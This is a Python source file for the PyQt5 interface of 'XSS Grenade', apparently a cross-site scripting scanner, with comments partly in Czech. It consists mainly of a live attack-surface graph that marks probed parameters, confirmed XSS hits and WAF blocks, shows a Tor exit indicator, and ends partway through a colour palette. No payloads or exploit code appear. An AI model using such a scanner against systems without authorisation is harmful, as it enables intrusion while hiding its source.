# -*- coding: utf-8 -*-
"""
XSS Grenade GUI — PyQt5
Levý panel: ASCII logo + popis
Pravý panel: scan interface
Rozlišení: 1920x1080
"""

import sys
import os
import time
import queue as _queue
from pathlib import Path

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QLabel, QLineEdit, QPushButton, QTextEdit, QProgressBar,
    QStatusBar, QFrame, QGridLayout, QSpinBox, QDoubleSpinBox,
    QCheckBox, QTableWidget, QTableWidgetItem, QHeaderView,
    QGroupBox, QScrollArea,
    QDialog, QPlainTextEdit, QSizePolicy,
    QMessageBox, QComboBox,
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer, QPointF, QRectF, QSettings
from PyQt5.QtGui import (
    QFont, QColor, QTextCursor, QPainter, QPen, QFontMetrics, QBrush,
    QGuiApplication, QRadialGradient, QLinearGradient, QPainterPath,
)

import random as _rnd
import math as _math
import math   # also bare alias for AttackGraphWidget v2
from typing import Optional, Dict, List, Tuple
from urllib.parse import urlparse as _urlparse

# ════════════════════════════════════════════════════════════════════════
# ATTACK GRAPH WIDGET v2 — force-directed live attack surface graph
# ════════════════════════════════════════════════════════════════════════
# Replaces old radial+linear layout. Key differences:
#   - no hard limits (every path/param/hit tracked)
#   - viewport culling (scales to thousands of nodes)
#   - mouse zoom + pan, right-click fit-to-view
#   - lazy auto-create on every API method (hits never lost)
#   - GATE-aware coloring (xss_executable / tag_injection / text_only)
# Public API kept drop-in compatible with old AttackGraphWidget.
# ════════════════════════════════════════════════════════════════════════


# ════════════════════════════════════════════════════════════════════════════
# COLOR PALETTE
# ════════════════════════════════════════════════════════════════════════════

# Background / chrome
BG_TOP    = QColor("#0d0e10")
BG_BOTTOM = QColor("#16181c")
GRID      = QColor(255, 255, 255, 8)

# Connection lines
LINK_DIM  = QColor(255, 255, 255, 30)
LINK_HOT  = QColor(255, 255, 255, 75)

# Node fills by state
COL_ROOT      = QColor("#5eead4")     # teal — root target
COL_PATH      = QColor("#94a3b8")     # slate — path
COL_PARAM     = QColor("#cbd5e1")     # light — param probing

COL_XSS_EXEC  = QColor("#ef4444")     # red — true XSS executable
COL_TAG_INJ   = QColor("#f97316")     # orange — tag injection only
COL_TEXT_ONLY = QColor("#64748b")     # gray — informational reflection
COL_HIT_LEGACY = QColor("#10b981")    # green — legacy "hit" w/o gate info

COL_WAF       = QColor("#fbbf24")     # amber — WAF blocked

# Text
TXT_PRIMARY   = QColor("#e2e8f0")
TXT_SECONDARY = QColor("#94a3b8")
TXT_DIM       = QColor("#64748b")

# Tor indicator
TOR_ON  = QColor("#a78bfa")
TOR_OFF = QColor("#475569")


# ════════════════════════════════════════════════════════════════════════════
# DATA MODEL
# ════════════════════════════════════════════════════════════════════════════

class _Node:
    """A node in the force-directed graph."""
    __slots__ = (
        "id", "label", "kind", "state", "x", "y", "vx", "vy",
        "fixed", "pulse_ph", "details", "parent_id", "created_ts",
        "gate_klass", "gate_severity",
    )

    def __init__(self, node_id: str, label: str, kind: str,
                 x: float = 0.0, y: float = 0.0,
                 parent_id: Optional[str] = None):
        self.id = node_id
        self.label = label
        self.kind = kind             # 'root' | 'path' | 'param'
        self.state = "idle"          # 'idle' | 'probing' | 'hit' | 'waf'
        self.x = x
        self.y = y
        self.vx = 0.0
        self.vy = 0.0
        self.fixed = False
        self.pulse_ph = _rnd.random()
        self.details: dict = {}
        self.parent_id = parent_id
        self.created_ts = time.time()
        self.gate_klass: Optional[str] = None
        self.gate_severity: Optional[str] = None


# ════════════════════════════════════════════════════════════════════════════
# WIDGET
# ════════════════════════════════════════════════════════════════════════════

class AttackGraphWidget(QWidget):
    """Force-directed live attack surface graph (v2)."""

    sig_hit_clicked = pyqtSignal(dict)
    sig_expand_clicked = pyqtSignal()

    # Animation
    TICK_MS         = 33               # ~30 fps
    SIM_ITERATIONS  = 2                # physics steps per tick

    # Force constants — tweakable for layout feel
    REPULSE_STRENGTH = 1800.0          # node-node repulsion
    REPULSE_RANGE_2  = 200.0 ** 2      # max distance² for repulsion
    SPRING_LEN_PATH  = 80.0            # ideal edge length root↔path
    SPRING_LEN_PARAM = 38.0            # ideal edge length path↔param
    SPRING_K         = 0.05            # edge stiffness
    DAMPING          = 0.85            # velocity decay per tick
    CENTER_GRAVITY   = 0.0008          # pull toward center

    # Node sizes
    R_ROOT  = 10.0
    R_PATH  = 6.0
    R_PARAM = 5.0
    R_HIT   = 8.0

    # Zoom
    ZOOM_MIN = 0.15
    ZOOM_MAX = 4.0
    ZOOM_STEP = 1.15

    def __init__(self, parent=None, font_size=11, speed_ms=55):
        super().__init__(parent)
        self._font_size = font_size

        self.setAttribute(Qt.WA_OpaquePaintEvent, True)
        self.setMinimumHeight(220)
        self.setMouseTracking(True)

        # Graph state — zero hard limits
        self._nodes: Dict[str, _Node] = {}
        self._edges: List[Tuple[str, str]] = []   # (parent_id, child_id)
        self._target_host: Optional[str] = None
        self._is_running = False

        # Counters (always live, never capped)
        self._hit_count = 0
        self._waf_count = 0
        self._path_count = 0
        self._param_count = 0

        # View transform
        self._zoom = 1.0
        self._pan_x = 0.0
        self._pan_y = 0.0
        self._dragging = False
        self._drag_last: Optional[QPointF] = None

        # Hover
        self._hover_node_id: Optional[str] = None

        # Tor
        self._tor_active = False
        self._tor_exit_ip: Optional[str] = None

        # Anim phase
        self._t = 0.0

        # Initial zoom-to-fit pending flag — fits view after first layout settles
        self._fit_pending = False

        self._tick_timer = QTimer(self)
        self._tick_timer.timeout.connect(self._tick)
        self._tick_timer.start(self.TICK_MS)

        # ── Overlay control: "expand to full window" lives INSIDE the graph
        # (top-right), so it travels with the widget when it is reparented into
        # the full-window view. No separate header bar above the graph. ──
        self._expanded = False
        self._ov_theme = None
        self._btn_expand = QPushButton("⛶", self)   # ⛶
        self._btn_expand.setCursor(Qt.PointingHandCursor)
        self._btn_expand.setFixedSize(28, 28)
        self._btn_expand.setToolTip("Expand to full window")
        self._btn_expand.clicked.connect(lambda: self.sig_expand_clicked.emit())
        self._style_overlay_btn()
        self._btn_expand.show()
        self._position_overlay()

    # ── Overlay button helpers ──────────────────────────────────────────
    def _style_overlay_btn(self):
        light = active_theme_name() == "light"
        if light:
            bg, fg, bd, hov = ("rgba(255,255,255,0.92)", "#334155",
                               "rgba(15,23,42,0.18)", "rgba(226,232,240,0.98)")
        else:
            bg, fg, bd, hov = ("rgba(22,25,31,0.88)", "#cbd5e1",
                               "rgba(255,255,255,0.14)", "rgba(45,51,62,0.96)")
        self._btn_expand.setStyleSheet(
            "QPushButton{background:%s;color:%s;border:1px solid %s;"
            "border-radius:7px;font-size:14px;padding:0;}"
            "QPushButton:hover{background:%s;}" % (bg, fg, bd, hov))

    def _position_overlay(self):
        b = getattr(self, "_btn_expand", None)
        if b is not None:
            b.move(max(0, self.width() - b.width() - 12), 12)
            b.raise_()

    def resizeEvent(self, e):
        super().resizeEvent(e)
        self._position_overlay()

    def set_expanded(self, expanded: bool):
        """Full-window view provides its own close control, so hide the in-graph
        expand button while expanded (prevents a redundant second affordance).
        Also re-fit: the widget's size changes dramatically on expand/restore, so
        the old pan/zoom is stale and the node cluster ends up off to one side —
        request a re-centre at the new size."""
        self._expanded = bool(expanded)
        b = getattr(self, "_btn_expand", None)
        if b is not None:
            b.setVisible(not self._expanded)
        # defer the fit until AFTER the new (full-window / panel) geometry has been
        # applied by the layout, so _fit_view centres on the real size, not the old.
        self._fit_pending = True
        QTimer.singleShot(70, self._fit_view)

    # ════════════════════════════════════════════════════════════════════
    # PUBLIC API (drop-in compatible)
    # ════════════════════════════════════════════════════════════════════

    def set_target(self, url: str):
        if not url:
            return
        parsed = _urlparse(url if "://" in url else f"http://{url}")
        host = parsed.netloc or parsed.path.split("/")[0]
        if not host:
            return

        self._target_host = host
        self._is_running = True
        self._reset_graph()

        # Create root node centered
        cx = self.width() / 2 if self.width() > 0 else 300
        cy = self.height() / 2 if self.height() > 0 else 150
        root = _Node("__root__", host, "root", x=cx, y=cy)
        root.fixed = True
        self._nodes["__root__"] = root
        self.update()

    def add_path(self, path: str) -> str:
        """Add a path node. Returns node_id (whether new or existing)."""
        if not self._target_host:
            # Lazy: even without explicit set_target, accept path adds —
            # but only if user has set a target via reset. Be defensive.
            return ""
        norm = self._norm_path(path)
        node_id = f"path::{norm}"
        if node_id in self._nodes:
            return node_id
        # Place near root with slight random offset so it doesn't stack
        rx, ry = self._random_near("__root__", 60.0)
        n = _Node(node_id, self._display_path(norm), "path",
                  x=rx, y=ry, parent_id="__root__")
        self._nodes[node_id] = n
        self._edges.append(("__root__", node_id))
        self._path_count += 1
        self._fit_pending = True
        self.update()
        return node_id

    def add_param(self, path: str, name: str) -> str:
        """Add a param node under the given path. Auto-creates path."""
        if not name:
            return ""
        path_id = self.add_path(path)
        if not path_id:
            return ""
        norm_path = self._norm_path(path)
        param_id = f"param::{norm_path}::{name}"
        if param_id in self._nodes:
            return param_id
        rx, ry = self._random_near(path_id, 30.0)
        n = _Node(param_id, self._display_param(name), "param",
                  x=rx, y=ry, parent_id=path_id)
        n.state = "probing"
        self._nodes[param_id] = n
        self._edges.append((path_id, param_id))
        self._param_count += 1
        self.update()
        return param_id

    def mark_hit(self, path: str, param: str, details: Optional[dict] = None):
        """
        Mark a parameter as confirmed XSS hit. Auto-creates path AND
        param nodes if they don't exist yet — this fixes the old bug
        where hits on uncrawled endpoints disappeared.
        """
        if not param:
            return
        param_id = self.add_param(path, param)
        if not param_id:
            return
        n = self._nodes.get(param_id)
        if n is None:
            return
        # Was already a hit? Don't double-count
        prev_state = n.state
        n.state = "hit"
        n.details = details or {}
        # Always store full path & param (un-truncated) in details for click handler
        n.details.setdefault("path", path)
        n.details.setdefault("param", param)
        n.details.setdefault("display_path", n.label)
        n.details.setdefault("display_param", n.label)

        # Pull GATE classification from details (set by xss_grenade v2)
        n.gate_klass = (details or {}).get("gate_klass")
        n.gate_severity = (details or {}).get("gate_severity")

        if prev_state != "hit":
            self._hit_count += 1
        self.update()

    def mark_waf(self, path: str, param: str):
        if not param:
            return
        param_id = self.add_param(path, param)
        if not param_id:
            return
        n = self._nodes.get(param_id)
        if n is None or n.state == "hit":
            return
        if n.state != "waf":
            n.state = "waf"
            self._waf_count += 1
        self.update()

    def set_tor_status(self, active: bool, exit_ip: Optional[str] = None):
        self._tor_active = active
        self._tor_exit_ip = exit_ip
        self.update()

    def reset(self):
        self._target_host = None
        self._is_running = False
        self._reset_graph()
        self.update()

    def stop(self):
        self._is_running = False
        self.update()

    # Compat shims kept for callers that use them
    def inject_hit(self):
        # Pick a random known param and mark as hit (used for demo)
        param_nodes = [n for n in self._nodes.values() if n.kind == "param"]
        if param_nodes:
            pick = _rnd.choice(param_nodes)
            parent_label = self._nodes.get(pick.parent_id, _Node("?", "?", "?")).label
            self.mark_hit(parent_label, pick.label)

    def inject_line(self, text, status=None):
        pass    # no-op in v2 (was used by BiosPanel old API)

    def tick_pulse(self):
        pass    # no-op

    # ════════════════════════════════════════════════════════════════════
    # INTERNAL HELPERS
    # ════════════════════════════════════════════════════════════════════

    def _reset_graph(self):
        self._nodes.clear()
        self._edges.clear()
        self._hit_count = 0
        self._waf_count = 0
        self._path_count = 0
        self._param_count = 0
        self._zoom = 1.0
        self._pan_x = 0.0
        self._pan_y = 0.0
        self._fit_pending = False

    @staticmethod
    def _norm_path(path: str) -> str:
        if "?" in path:
            path = path.split("?")[0]
        if "#" in path:
            path = path.split("#")[0]
        return path or "/"

    @staticmethod
    def _display_path(path: str, width: int = 22) -> str:
        if len(path) <= width:
            return path
        return path[:width - 2] + ".."

    @staticmethod
    def _display_param(name: str, width: int = 14) -> str:
        if len(name) <= width:
            return name
        return name[:width - 2] + ".."

    def _random_near(self, anchor_id: str, dist: float) -> Tuple[float, float]:
        """Random initial position near anchor — used so new nodes don't
        spawn at exactly the same pixel and instantly NaN-explode the sim."""
        a = self._nodes.get(anchor_id)
        if a is None:
            cx = self.width() / 2 if self.width() > 0 else 300
            cy = self.height() / 2 if self.height() > 0 else 150
            return cx, cy
        ang = _rnd.uniform(0, 2 * math.pi)
        return (a.x + dist * math.cos(ang) + _rnd.uniform(-3, 3),
                a.y + dist * math.sin(ang) + _rnd.uniform(-3, 3))

    # ════════════════════════════════════════════════════════════════════
    # PHYSICS
    # ════════════════════════════════════════════════════════════════════

    def _step_simulation(self):
        if not self._nodes:
            return
        nodes = list(self._nodes.values())
        cx = self.width() / 2
        cy = self.height() / 2

        # 1) repulsion (O(n²) but with cutoff) — cheap up to ~500 nodes
        n = len(nodes)
        for i in range(n):
            ni = nodes[i]
            if ni.fixed:
                continue
            for j in range(i + 1, n):
                nj = nodes[j]
                dx = ni.x - nj.x
                dy = ni.y - nj.y
                d2 = dx * dx + dy * dy
                if d2 == 0.0:
                    dx, dy = _rnd.uniform(-1, 1), _rnd.uniform(-1, 1)
                    d2 = 1.0
                if d2 > self.REPULSE_RANGE_2:
                    continue
                f = self.REPULSE_STRENGTH / d2
                d = math.sqrt(d2)
                ux, uy = dx / d, dy / d
                ni.vx += ux * f
                ni.vy += uy * f
                if not nj.fixed:
                    nj.vx -= ux * f
                    nj.vy -= uy * f

        # 2) springs — edges pull together
        for parent_id, child_id in self._edges:
            p = self._nodes.get(parent_id)
            c = self._nodes.get(child_id)
            if not p or not c:
                continue
            dx = c.x - p.x
            dy = c.y - p.y
            d = math.sqrt(dx * dx + dy * dy) + 1e-9
            ideal = (self.SPRING_LEN_PATH if c.kind == "path"
                     else self.SPRING_LEN_PARAM)
            disp = (d - ideal) * self.SPRING_K
            ux, uy = dx / d, dy / d
            if not p.fixed:
                p.vx += ux * disp
                p.vy += uy * disp
            if not c.fixed:
                c.vx -= ux * disp
                c.vy -= uy * disp

        # 3) gravity toward center (so disconnected components don't drift)
        for n in nodes:
            if n.fixed:
                continue
            n.vx += (cx - n.x) * self.CENTER_GRAVITY
            n.vy += (cy - n.y) * self.CENTER_GRAVITY

        # 4) integrate + damping + clamp velocity
        max_v = 8.0
        for n in nodes:
            if n.fixed:
                n.vx = n.vy = 0
                continue
            n.vx *= self.DAMPING
            n.vy *= self.DAMPING
            # clamp so unstable forces don't fling nodes off-screen
            sp = math.sqrt(n.vx * n.vx + n.vy * n.vy)
            if sp > max_v:
                n.vx = n.vx / sp * max_v
                n.vy = n.vy / sp * max_v
            n.x += n.vx
            n.y += n.vy

    def _tick(self):
        self._t += self.TICK_MS / 1000.0
        if self._is_running and self._nodes:
            for _ in range(self.SIM_ITERATIONS):
                self._step_simulation()

        # Auto-fit when new nodes added (gentle, ~3 sec settle then fit once)
        if self._fit_pending and self._t > 0.5:
            self._fit_view()
            self._fit_pending = False

        self.update()

    def _fit_view(self):
        """Fit all nodes into widget — used on initial layout & right-click."""
        if not self._nodes:
            return
        xs = [n.x for n in self._nodes.values()]
        ys = [n.y for n in self._nodes.values()]
        x_min, x_max = min(xs), max(xs)
        y_min, y_max = min(ys), max(ys)
        bw = max(1.0, x_max - x_min)
        bh = max(1.0, y_max - y_min)

        # generous padding so node LABELS (which extend below/beside the node)
        # don't clip at the viewport edges after fitting
        ww = max(1, self.width()) - 150
        wh = max(1, self.height()) - 140

        z_x = ww / bw
        z_y = wh / bh
        z = min(z_x, z_y, self.ZOOM_MAX)
        z = max(self.ZOOM_MIN, z)
        self._zoom = z

        # Pan so center of bbox lands at center of widget
        bcx = (x_min + x_max) / 2
        bcy = (y_min + y_max) / 2
        self._pan_x = self.width() / 2 - bcx * z
        self._pan_y = self.height() / 2 - bcy * z

    # ════════════════════════════════════════════════════════════════════
    # COORDINATE TRANSFORMS
    # ════════════════════════════════════════════════════════════════════

    def _world_to_screen(self, x: float, y: float) -> Tuple[float, float]:
        return (x * self._zoom + self._pan_x,
                y * self._zoom + self._pan_y)

    def _screen_to_world(self, sx: float, sy: float) -> Tuple[float, float]:
        return ((sx - self._pan_x) / self._zoom,
                (sy - self._pan_y) / self._zoom)

    # ════════════════════════════════════════════════════════════════════
    # MOUSE
    # ════════════════════════════════════════════════════════════════════

    def _node_at_screen(self, sx: float, sy: float) -> Optional[_Node]:
        # Walk in reverse — newer nodes drawn on top should hit first
        for n in reversed(list(self._nodes.values())):
            ssx, ssy = self._world_to_screen(n.x, n.y)
            r = self._node_radius(n) * self._zoom
            r_click = max(8.0, r + 4)   # generous hitbox
            dx = sx - ssx
            dy = sy - ssy
            if dx * dx + dy * dy <= r_click * r_click:
                return n
        return None

    def _node_radius(self, n: _Node) -> float:
        if n.kind == "root":
            return self.R_ROOT
        if n.kind == "path":
            return self.R_PATH
        if n.state == "hit":
            return self.R_HIT
        return self.R_PARAM

    def mouseMoveEvent(self, event):
        if self._dragging and self._drag_last is not None:
            dx = float(event.x()) - self._drag_last.x()
            dy = float(event.y()) - self._drag_last.y()
            self._pan_x += dx
            self._pan_y += dy
            self._drag_last = QPointF(event.x(), event.y())
            self.update()
        else:
            n = self._node_at_screen(float(event.x()), float(event.y()))
            new_id = n.id if n else None
            if new_id != self._hover_node_id:
                self._hover_node_id = new_id
                if n and n.state == "hit":
                    self.setCursor(Qt.PointingHandCursor)
                else:
                    self.setCursor(Qt.ArrowCursor)
                self.update()
        super().mouseMoveEvent(event)

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            n = self._node_at_screen(float(event.x()), float(event.y()))
            if n is not None and n.state == "hit":
                emit_data = dict(n.details or {})
                emit_data.setdefault("display_path", n.label)
                emit_data.setdefault("display_param", n.label)
                self.sig_hit_clicked.emit(emit_data)
                return
            # Otherwise start panning
            self._dragging = True
            self._drag_last = QPointF(event.x(), event.y())
            self.setCursor(Qt.ClosedHandCursor)
        elif event.button() == Qt.RightButton:
            self._fit_view()
            self.update()
        super().mousePressEvent(event)

    def mouseReleaseEvent(self, event):
        if self._dragging:
            self._dragging = False
            self._drag_last = None
            self.setCursor(Qt.ArrowCursor)
        super().mouseReleaseEvent(event)

    def wheelEvent(self, event):
        # Zoom toward cursor
        delta = event.angleDelta().y()
        if delta == 0:
            return
        factor = self.ZOOM_STEP if delta > 0 else (1.0 / self.ZOOM_STEP)
        new_zoom = max(self.ZOOM_MIN, min(self.ZOOM_MAX, self._zoom * factor))
        if new_zoom == self._zoom:
            return
        # Keep cursor world position fixed
        sx = float(event.x())
        sy = float(event.y())
        wx, wy = self._screen_to_world(sx, sy)
        self._zoom = new_zoom
        self._pan_x = sx - wx * self._zoom
        self._pan_y = sy - wy * self._zoom
        self.update()

    def leaveEvent(self, event):
        self._hover_node_id = None
        self.setCursor(Qt.ArrowCursor)
        super().leaveEvent(event)

    # ════════════════════════════════════════════════════════════════════
    # PAINTING
    # ════════════════════════════════════════════════════════════════════

    def _font(self, size_delta=-2, bold=False) -> QFont:
        f = QFont("JetBrains Mono", self._font_size + size_delta)
        if not f.exactMatch():
            f = QFont("Courier New", self._font_size + size_delta)
        f.setBold(bold)
        return f

    def paintEvent(self, event):
        # keep the overlay button in sync with live theme switches (cheap check)
        _tn = active_theme_name()
        if self._ov_theme != _tn:
            self._ov_theme = _tn
            self._style_overlay_btn()

        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing, True)

        self._draw_background(p)
        self._draw_grid(p)

        if not self._target_host or not self._nodes:
            self._draw_idle(p)
        else:
            self._draw_edges(p)
            self._draw_nodes(p)

        self._draw_hud(p)

        p.end()

    def _draw_background(self, p: QPainter):
        rect = self.rect()
        grad = QLinearGradient(0, 0, 0, rect.height())
        if active_theme_name() == "light":
            grad.setColorAt(0.0, QColor("#f6f7f9"))
            grad.setColorAt(1.0, QColor("#e9edf2"))
        else:
            grad.setColorAt(0.0, QColor(theme("bg_deep")))
            grad.setColorAt(1.0, QColor(theme("bg_card")))
        p.fillRect(rect, QBrush(grad))

    def _draw_grid(self, p: QPainter):
        grid = QColor(0, 0, 0, 14) if active_theme_name() == "light" else GRID
        p.setPen(QPen(grid, 1))
        step = 24
        x = 0
        while x < self.width():
            p.drawLine(x, 0, x, self.height())
            x += step
        y = 0
        while y < self.height():
            p.drawLine(0, y, self.width(), y)
            y += step

    def _draw_idle(self, p: QPainter):
        # In the full-window view the big empty canvas + the "target: (idle)" HUD
        # already convey the state; a centered placeholder there just clutters /
        # overlaps the graph, so skip it when expanded.
        if getattr(self, "_expanded", False):
            return
        # Docked panel: word-wrap + side padding so the hint is never clipped on
        # the narrow (~360px) panel (the old single AlignCenter line cut both ends
        # → "ttack graph — set target to begi").
        p.setPen(TXT_DIM)
        p.setFont(self._font(-1, bold=True))
        r = self.rect().adjusted(16, 0, -16, 0)
        p.drawText(r, Qt.AlignCenter | Qt.TextWordWrap,
                   "Attack graph\nset a target to begin")

    def _draw_edges(self, p: QPainter):
        # Viewport culling: only draw edges where at least one endpoint is on screen
        rect = self.rect()
        margin = 80
        # Theme-aware connector color: the old dim edge was white@30-alpha, which
        # is INVISIBLE on the light "paper" background. Use a dark slate line on
        # light, the original faint white on dark.
        light = active_theme_name() == "light"
        dim_edge = QColor(71, 85, 105, 120) if light else LINK_DIM   # slate-600
        for parent_id, child_id in self._edges:
            pn = self._nodes.get(parent_id)
            cn = self._nodes.get(child_id)
            if not pn or not cn:
                continue
            psx, psy = self._world_to_screen(pn.x, pn.y)
            csx, csy = self._world_to_screen(cn.x, cn.y)
            if (max(psx, csx) < -margin or min(psx, csx) > self.width() + margin or
                max(psy, csy) < -margin or min(psy, csy) > self.height() + margin):
                continue

            # Color: edges to "hit" or "waf" nodes get accent (stronger on light)
            if cn.state == "hit":
                col = QColor(COL_XSS_EXEC)
                col.setAlpha(190 if light else 130)
                w = 1.7
            elif cn.state == "waf":
                col = QColor(COL_WAF)
                col.setAlpha(180 if light else 115)
                w = 1.5
            else:
                col = dim_edge
                w = 1.1
            pen = QPen(col, w)
            pen.setCapStyle(Qt.RoundCap)
            p.setPen(pen)
            p.drawLine(int(psx), int(psy), int(csx), int(csy))

    def _draw_nodes(self, p: QPainter):
        rect = self.rect()
        margin = 60
        # Sort: root, path, param-idle, param-probing, param-waf, param-hit
        def sort_key(n: _Node):
            order = {"root": 0, "path": 1}.get(n.kind, 2)
            sub = {"idle": 0, "probing": 1, "waf": 2, "hit": 3}.get(n.state, 0)
            return (order, sub)
        for n in sorted(self._nodes.values(), key=sort_key):
            sx, sy = self._world_to_screen(n.x, n.y)
            r = self._node_radius(n) * self._zoom
            # Cull off-screen
            if sx < -margin or sx > self.width() + margin:
                continue
            if sy < -margin or sy > self.height() + margin:
                continue
            self._draw_one_node(p, n, sx, sy, r)

    def _draw_one_node(self, p: QPainter, n: _Node, sx: float, sy: float, r: float):
        # Determine fill color by kind/state/gate
        if n.kind == "root":
            fill = COL_ROOT
        elif n.kind == "path":
            fill = COL_PATH
        elif n.state == "hit":
            # Use gate classification when available, else legacy green
            if n.gate_klass == "xss_executable":
                fill = COL_XSS_EXEC
            elif n.gate_klass == "tag_injection":
                fill = COL_TAG_INJ
            elif n.gate_klass == "text_only":
                fill = COL_TEXT_ONLY
            else:
                fill = COL_HIT_LEGACY
        elif n.state == "waf":
            fill = COL_WAF
        elif n.state == "probing":
            fill = COL_PARAM
        else:
            fill = COL_PARAM

        # Halo for hit/waf
        if n.state in ("hit", "waf"):
            phase = (math.sin(self._t * 4.0 + n.pulse_ph * 6.28) + 1) / 2
            halo_r = r + 6 + phase * 5
            halo = QColor(fill)
            halo.setAlpha(int(50 + phase * 60))
            p.setPen(Qt.NoPen)
            p.setBrush(QBrush(halo))
            p.drawEllipse(QPointF(sx, sy), halo_r, halo_r)

        # Hover ring
        if self._hover_node_id == n.id:
            ring = QColor(255, 255, 255, 100)
            p.setPen(QPen(ring, 1.5))
            p.setBrush(Qt.NoBrush)
            p.drawEllipse(QPointF(sx, sy), r + 3, r + 3)

        # Main node
        p.setPen(QPen(QColor(0, 0, 0, 80), 1))
        p.setBrush(QBrush(fill))
        p.drawEllipse(QPointF(sx, sy), r, r)

        # Inner highlight (gives glassy look)
        glow = QRadialGradient(sx, sy - r * 0.3, r)
        c1 = QColor(255, 255, 255, 90)
        c2 = QColor(255, 255, 255, 0)
        glow.setColorAt(0, c1)
        glow.setColorAt(1, c2)
        p.setPen(Qt.NoPen)
        p.setBrush(QBrush(glow))
        p.drawEllipse(QPointF(sx, sy), r, r)

        # Label — only at sufficient zoom or for important nodes
        zoom_thresh = 0.6
        show_label = (n.kind in ("root",) or n.state == "hit"
                      or self._zoom >= zoom_thresh
                      or self._hover_node_id == n.id)
        if show_label and n.label:
            label_y_offset = r + 12
            p.setFont(self._font(-3, bold=(n.kind == "root")))
            color = TXT_PRIMARY if (n.state == "hit" or n.kind == "root") \
                                else TXT_SECONDARY
            p.setPen(color)
            metrics = p.fontMetrics()
            tw = metrics.horizontalAdvance(n.label)
            p.drawText(int(sx - tw / 2), int(sy + label_y_offset), n.label)

    def _hud_colors(self):
        """Theme-aware barvy HUD textu na canvasu (světlý canvas → tmavý text)."""
        if active_theme_name() == "light":
            return (QColor("#1f2733"), QColor("#5b6473"), QColor("#6b7484"))
        return (TXT_PRIMARY, TXT_DIM, TXT_SECONDARY)

    def _draw_hud(self, p: QPainter):
        hud_primary, hud_dim, hud_secondary = self._hud_colors()
        # Top-left: target host + status
        p.setFont(self._font(-1, bold=True))
        target_text = ""
        if self._target_host:
            p.setPen(hud_primary)
            status = " ▶ scanning" if self._is_running else " ◼ done"
            target_text = f"target: {self._target_host}{status}"
            p.drawText(12, 18, target_text)
        else:
            p.setPen(hud_dim)
            target_text = "target: (idle)"
            p.drawText(12, 18, target_text)
        # změř šířku target textu (pro detekci kolize s countery)
        target_w = p.fontMetrics().horizontalAdvance(target_text)

        # Top-right: counters. In the docked panel these 4 numbers are ALREADY
        # shown in the 2×2 telemetry tiles right above the graph, so painting
        # them here too is redundant AND collided with the expand overlay button.
        # Show them only in the full-window view (where the tiles aren't present).
        if self._expanded:
            counters = (
                f"paths: {self._path_count}   "
                f"params: {self._param_count}   "
                f"hits: {self._hit_count}   "
                f"waf: {self._waf_count}"
            )
            p.setFont(self._font(-2))
            p.setPen(hud_secondary)
            metrics = p.fontMetrics()
            tw = metrics.horizontalAdvance(counters)
            counters_x = self.width() - tw - 12
            gap = 16  # minimální mezera mezi target textem a countery
            if counters_x < 12 + target_w + gap:
                p.drawText(12, 34, counters)   # fallback to 2nd line
            else:
                p.drawText(counters_x, 18, counters)

        # Bottom-left: Tor status
        p.setFont(self._font(-3))
        if self._tor_active:
            p.setPen(TOR_ON)
            tor_txt = (f"⚓ TOR · exit {self._tor_exit_ip}"
                       if self._tor_exit_ip else "⚓ TOR active")
        else:
            p.setPen(TOR_OFF)
            tor_txt = ""   # don't clutter when off
        if tor_txt:
            p.drawText(12, self.height() - 8, tor_txt)

        # Bottom-right: zoom + hint
        p.setFont(self._font(-3))
        p.setPen(hud_dim)
        hint = f"zoom {self._zoom:.2f}x   ·   wheel zoom · drag pan · right-click fit"
        metrics = p.fontMetrics()
        tw = metrics.horizontalAdvance(hint)
        p.drawText(self.width() - tw - 12, self.height() - 8, hint)


# ════════════════════════════════════════════════════════════════════════
# DARK STYLESHEET — Qt dark theme
# ════════════════════════════════════════════════════════════════════════
import string as _string

# ════════════════════════════════════════════════════════════════════════
# THEME SYSTEM (v10.29) — světlá / tmavá paleta, přepínatelné v Settings
# ════════════════════════════════════════════════════════════════════════
# Sémantické tokeny — hlavní stylesheet i inline styly je referencují přes
# theme()/THEME, takže přepnutí palety přebarví celé UI. Brand accent
# (#ff2d55) zůstává v obou režimech kvůli TX-C0RE identitě.

PALETTES = {
    "dark": {
        "bg":            "#26282e",
        "bg_alt":        "#2c2f36",
        "bg_deep":       "#1d1f24",
        "bg_card":       "#2f323a",
        "bg_input":      "#1f2127",
        "bg_input_focus": "#24272e",
        "bg_btn":        "#363a43",
        "bg_btn_hover":  "#3e434d",
        "bg_tab":        "#2a2d34",
        "bg_tab_sel":    "#343841",
        "bg_tab_hover":  "#2f333a",
        "bg_tooltip":    "#34383f",
        "bg_header":     "#2c2f36",
        "bg_alt_row":    "#2a2d34",
        "fg":            "#e9ebef",
        "fg_muted":      "#9aa0ab",
        "fg_faint":      "#6f7682",
        "fg_strong":     "#ffffff",
        "fg_btn":        "#d9dde4",
        "fg_tooltip":    "#eaecf0",
        "fg_table":      "#dde1e8",
        "fg_header":     "#c3c9d3",
        "fg_group":      "#abb1bc",
        "border":        "#3a3e47",
        "border_input":  "#444952",
        "border_subtle": "#34383f",
        "accent":        "#ff2d55",
        "accent_text":   "#ff5573",
        "accent_hover":  "#ff4d6d",
        "sel_bg":        "#2a0710",
        "sel_fg":        "#ffffff",
        "scrollbar":     "#2c323d",
        "disabled_bg":   "#3a0a14",
        "disabled_fg":   "#9a9a9a",
        "divider":       "#222222",
        "card_sep":      "#222222",
        "warn_text":     "#ff8800",
        "warn_bg":       "#1a0f00",
        "warn_border":   "#5a3000",
    },
    "light": {
        # v10.65 — calm "graphite on soft gray paper" palette. Red text was
        # eyestrain on near-white, so brand red is now reserved for the RUN/STOP
        # actions + functional affordances only; ALL labels/values/titles/
        # headers use graphite (accent_text) so nothing bright bites the eye.
        "bg":            "#eceef2",   # window / group areas — soft gray
        "bg_alt":        "#e3e6ec",   # recessed panels
        "bg_deep":       "#e6e9ee",   # app canvas / top bar / tables / log (not white)
        "bg_card":       "#f4f6f8",   # cards — light but not stark white (raised on canvas)
        "bg_input":      "#fbfcfd",   # inputs — near-white for clear affordance
        "bg_input_focus": "#ffffff",
        "bg_btn":        "#e4e7ed",
        "bg_btn_hover":  "#d8dde5",
        "bg_tab":        "#dfe3e9",
        "bg_tab_sel":    "#f4f6f8",
        "bg_tab_hover":  "#e8ebf0",
        "bg_tooltip":    "#f4f6f8",
        "bg_header":     "#e3e6ec",
